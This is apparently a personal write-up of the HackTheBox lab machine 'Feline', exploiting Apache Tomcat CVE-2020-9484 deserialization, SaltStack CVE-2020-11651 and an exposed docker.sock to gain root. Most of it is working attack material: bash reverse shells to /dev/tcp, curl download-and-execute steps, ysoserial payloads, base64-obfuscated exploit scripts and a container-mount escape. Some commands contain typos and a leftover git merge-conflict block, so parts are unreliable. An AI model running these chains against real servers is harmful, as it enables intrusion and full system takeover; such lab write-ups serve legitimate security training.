---
title: Lab - HTB - Hard - Feline (HackyHour5)
date: 2020-11-13 11:11:11 -0400
description: HackTheBox
categories: [Lab, HackTheBox]
# img: /assets/img/sample/rabbit.png
tags: [Lab, HackTheBox]
---

- [Lab - HTB - Hard - Feline (HackyHour5)](#lab---htb---hard---feline-hackyhour5)
  - [Initial：](#initial)
    - [Recon NMAP](#recon-nmap)
    - [CVE in 2020](#cve-in-2020)
  - [Gain access to shell](#gain-access-to-shell)
    - [Port 8080](#port-8080)
    - [burpsuite the request](#burpsuite-the-request)
    - [Apache Tomcat 9.0.27 vulnerability CVE - 2020 - 9484](#apache-tomcat-9027-vulnerability-cve---2020---9484)
    - [use ysoserial to serialize the file](#use-ysoserial-to-serialize-the-file)
  - [Access extension](#access-extension)
    - [user Tomcat](#user-tomcat)
    - [cve-2020-11651 PoC](#cve-2020-11651-poc)

- ref
  - [na5c4r](https://www.youtube.com/channel/UCh35oGf3_djXJbJVZ1KJ40g)
  - [masahiro331/CVE-2020-9484](https://github.com/masahiro331/CVE-2020-9484)
  - [Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
  - [CVE-2020-9484 Tomcat RCE漏洞分析](https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg)
  - [IdealDreamLast/CVE-2020-9484](https://github.com/IdealDreamLast/CVE-2020-9484)
  - [blog](https://estamelgg.github.io/posts/Feline/)


---

# Lab - HTB - Hard - Feline (HackyHour5)

![feline](https://i.imgur.com/DPdHOxS.png)
> Machine: Feline


```
1. use nmap to find the open port
2. find the open port 8080
3. investiate the webpage, it allows upload file
4. burpsuite the request
   - able to diy the file name
   - upload file content was been shown in post request
   - bad deserialize
5. find the CVE - 2020 - 9484
6. resend the request with empty filename
   - find the upload page: /upload.jsp
   - find the upload path: /opt/samples/uploads

7. create playload.sh
   - bash -c "bash -i >& /dev/tcp/10.10.15.118(your ip)/2424 0>&1"
   - (reverse shell code)

8. create uploadfile.session
   - curl http://10.10.15.118(your ip)/play1.sh -o /tmp/targetplay.sh
   - (upload the reverse shell code and store ie in /tmp/targetplay.sh)

9. create executefile.session
   - bash /tmp/targetplay.sh
   - (execute the targetplay.sh)

10. create curlcommand.sh
    - send curl command with the cookie and malicious files.

    bash:
    vim curlcomand.sh
    # !/bin/bash
    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/uploadfile' -F 'image=@uploadfile.session'
    sleep 1
    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/executefile' -F 'image=@executefile.session'


11. setup pyserver

12. setup netcat listener

13. run curlcommand and get the reverse shell
```

---

## Initial：

---

### Recon NMAP

NMAP:
- <font color=red> FINDING </font>
  - Port 222 SSH
  - Port 8080 Apache Tomcat 9.0.27


```bash
$ nmap -sC -p- 10.10.10.205

PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
4554/tcp open  msfrs
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
```

---

### CVE in 2020

Microsoft CVE-2020-16937: .NET Framework Information Disclosure Vulnerability


| Severity | CVSS                         | Published  |
| -------- | ---------------------------- | ---------- |
| 4        | (AV:N/AC:M/Au:N/C:P/I:N/A:N) | 10/13/2020 |


<font color=red> CVE-2020-9484 Tomcat RCE漏洞分析!!! </font>



| Severity | CVSS                                | Published  |
| -------- | ----------------------------------- | ---------- |
| 4        | AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N | 10/13/2020 |


![Screen Shot 2021-01-08 at 20.11.20](https://i.imgur.com/K1iSwBP.png)



---

## Gain access to shell


---

### Port 8080

1. go to the websites `10.10.10.205:8080/service`
   - ![Screen Shot 2021-01-15 at 20.56.41](https://i.imgur.com/h78yEk6.png)

2. website that able to upload the customer file



---

### burpsuite the request


CVE requirement:
- **Deserialization of Untrusted Data** <font color=green> not yet </font>
- **have to know the path** <font color=red> not yet </font>



1. create a file

    ```bash
    # gracetest,session
    echo "hello"
    ```

3. upload the file, burpsuite the request
   - ![Screen Shot 2021-01-15 at 19.53.55](https://i.imgur.com/VjiM9hv.png)

    ```
    POST /upload.jsp?email=ggg@gmail.com HTTP/1.1
    Host: 10.10.10.205:8080
    Content-Length: 219
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEIvHOzBgCXIy0Zlj
    Accept: */*
    Origin: http://10.10.10.205:8080
    Referer: http://10.10.10.205:8080/service/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: JSESSIONID=574DF69D0EA6E893D165D86BC9401D5B
    Connection: close

    ------WebKitFormBoundaryEIvHOzBgCXIy0Zlj
    Content-Disposition: form-data; name="image"; filename="gracetest.session"
    Content-Type: application/octet-stream

    echo "hello"

    ------WebKitFormBoundaryEIvHOzBgCXIy0Zlj--
    ```


3. upload the file, burp the request, empty the fileName
   - request
    ```
    POST /upload.jsp?email=ggg@gmail.com HTTP/1.1
    Host: 10.10.10.205:8080
    ...
    ------WebKitFormBoundaryEIvHOzBgCXIy0Zlj
    Content-Disposition: form-data; name="image"; filename=""
    Content-Type: application/octet-stream
    echo "hello"
    ------WebKitFormBoundaryEIvHOzBgCXIy0Zlj--
    ```

   - respond
    ```
    HTTP/1.1 200

    <div id="error">
    java.io.FileNotFoundException: /opt/samples/uploads (Is a directory)
    	at java.base/java.io.FileOutputStream.open0(Native Method)
    	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
        ....
    </div>
    ```


4. <font color=red> Finding </font>
   - upload page: /upload.jsp
   - file upload path: /opt/samples/uploads



---

### Apache Tomcat 9.0.27 vulnerability CVE - 2020 - 9484


1. Tomcat uses the word `“Manager”` to describe the component that does session management.
   - Sessions are used to preserve state between client requests,
   - Tomcat provides two implementations that can be used:
     - `org.apache.catalina.session.StandardManager` (default)
       - keep sessions in memory.
       - If tomcat is gracefully closed, it will store the sessions in a serialized object on disk (named “SESSIONS.ser” by default).

     - `org.apache.catalina.session.PersistentManager`
       - does the same thing, but with a little extra:
       - swapping out idle sessions.
       - If a session has been idle for x seconds, it will be swapped out to disk.
       - to reduce memory usage.

2. Set the JESSIONID cookie to the path where the file isuploaded
   - if the manager is `StandardManager`
     - it check the session on memory
     - if not ecist, it check on the disk
   - if the manager is `PersistentManager`
     - if the file exists, it will deserializa it and parse the session information from it


---

### use ysoserial to serialize the file


play1.sh (reverse shell code)

uploadfile.session (upload the reverse shell code and store ie in /tmp/targetplay.sh)

executefile.session (execute the targetplay.sh)



1. create the playload

    ```bash
    vim play1.sh
    # !/bin/bash
    bash -c "bash -i >& /dev/tcp/10.10.15.118(your ip)/2424 0>&1"
    ```

2. download the ysoserial source code
   - [使用github上的ysoserial工具](https://github.com/frohoff/ysoserial)
   - download the latest jar from [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

    ```bash
    git clone https://github.com/frohoff/ysoserial.git

    # 1. list the argu
    $  java -jar ysoserial.jar
    # Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'

    # 2. create seialized session file to download our payload with curl
    java -jar ysoserial.jar CommonsCollections2 "curl http://(your ip)/play1.sh -o /tmp/targetplay.sh" > uploadfile.session

    java -jar ysoserial.jar CommonsCollections2 "curl http://10.10.15.118/play1.sh -o /tmp/targetplay.sh" > uploadfile.session

    # 3. create second serizlized session file to execute the payload
    java -jar ysoserial.jar CommonsCollections2 "bash /tmp/targetplay.sh" > executefile.session
    ```

3. send curl command with the cookie and malicious files.

```bash
# vim curlcomand.sh
# !/bin/bash
curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/uploadfile' -F 'image=@uploadfile.session'
sleep 1
curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/executefile' -F 'image=@executefile.session'
```

4. setup listener for the reverse shell and webserver for the payload downloaded by the target

    ```bash
    # tab1:
    pyserver

    # tab2:
    nc -lvnp 2424

    # tab3:
    bash curlcomand.sh

    # tab2:
    # get the reverse shell!
    ```

---



```bash

git clone https://github.com/frohoff/ysoserial.git

mvn clean package -DskipTests


cd ysoserial/target/


vim run.sh
####################################################################################
# Hackthebox "Feline" deserializtion attack
#####################################################################################
#set command line parameters
ip=$1
port=$2
#reverse shell command the trget will execute
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
file=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)

# fux it with base64 to bypss bad characters
hexout="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"

#create yoserial payload
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 "$hexout" > /tmp/$file.session
echo $file

#upload the payload
curl -s -F "data=@/tmp/$file.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null

<<<<<<< HEAD
#reference paylaod in cookie
=======
#reference payload in cookie
>>>>>>> 1a148b47672b35d180699fc905d033785c8bbe28
curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" http://10.10.10.205:8080/ > /dev/null


ip=x.x.x.x
port=2424

bash test.sh $ip $port
```

## Access extension

---

### user Tomcat


```bash
cd /home/tomcat
cat user.txt | cut -c1-20




netstat -tulpn
# port 3505, 3506
# opening tge firewall for salt
# saltstack exploit

```


### cve-2020-11651 PoC


```bash
# tab1:
git clone git
python exploit.py

pyserver


# tab2: Tomcat
curl http://10.10.10.10/exploit.pu -o exploit.py
python exploit.py
# module not found on the target system
# use reverse portforwarding on port 4506 to run the exploit locally
```

chisel linux:
- fast TCP tunnel over HTTP
- on client: `./chisel client 110.10.10.10:9999 R:4506:localhost:4506`
- on server: `chisel server -p 999 -reverse`

```bash
# tab 1:
curl https://o.jpillora.com/chisel! | bash
# install in /usr.local/bin/chsel

# tab2: Tomcat
curl http://10.10.10.10/chisel -o chisel
chmod +x chisel

./chisel client 110.10.10.10:9999 R:4506:localhost:4506


# tab3:
chisel server -p 999 -reverse


# tab 1:
cd CVE-20202-11651-poc
python3 exploit.py --help

python3 exploit.py --master 127.0.0.1 --read /etc/passwd
python3 exploit.py --master 127.0.0.1 --read /root/root.txt

python3 exploit.py --master 127.0.0.1 --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.94/7878 0>&1"'



# tab 4:
nc -lvnp 7878
# get the root account
cat todo.txt

cat ./bash_history
curl -s --unix-socket /var/run/docker.sock http://localhost/image/json
# docker is accessible
# can run curl with unix socket to communicate with docker.sock
# Docker.sock allow us to create docker

```

Docker.sock exploit
- Node takeover

- mount the host/fileysystem on the new container
- container execute command whrn started
- we can mount the root ds and execute recerse shell when the container is started
- `Engine API v1.24`


```bash
# tab1:
vim exploitsock.sh
# ----------------
#!/bin/bash
# the command executed when the container is started
# change dir to tmp where the rootfs is mount and execute reverse shell
cmd-"[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/10.10.14.94/9898 0>&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it
# name the container 'na5c4r_root'
# -d: detached
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image:\":\"sandbox\",\"cmd\":$cmd.\"Binds\":[\"/:tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=na5c4r_root


# start the container
curl -s -X POST --unix-socket /var/run/docker.sock -d "http://localhost/containers/na5c4r_root/start"
# ----------------


# open a server
pyserver


# tab2: Tomcat
mkdir .na5c4r
curl http://10.10.10.10/exploitsock.sh -o exploitsock.sh
chmod -x exploitsock.sh
bash exploitsock.sh



# tab3:
nc -lvnp 9898
cat root.txt | cut -c1-20


```








```bash
# download ysoserial from https://github.com/frohoff/ysoserial
# name it ysoserial.jar
# put it in the same folder where you will put the next script

# use this script to get shell:
filename=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
ip=$1
port=$2
cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
java -jar ysoserial.jar CommonsCollections4 "$jex" > /tmp/$filename.session

curl -s -F "data=@/tmp/$filename.session" http://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null

# start nc listener:
nc -lvnp <port>

# run the script with your ip and port like this:
shell.sh <ip> <port>

# then you can get user.txt with:
cat ~/user.txt
```



running reverse shell normally wont work because of javas Runtime.exec(), so we have to create a workaround (http://www.jackson-t.ca/runtime-exec-payloads.html)
- try by entering normal payload e.g. `bash -i >& /dev/tcp/<ip>/<port> 0>&1`



---

ref:
- [masahiro331/CVE-2020-9484](https://github.com/masahiro331/CVE-2020-9484)
- [Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
- [CVE-2020-9484 Tomcat RCE漏洞分析](https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg)
- [IdealDreamLast/CVE-2020-9484](https://github.com/IdealDreamLast/CVE-2020-9484)
- [blog](https://estamelgg.github.io/posts/Feline/)
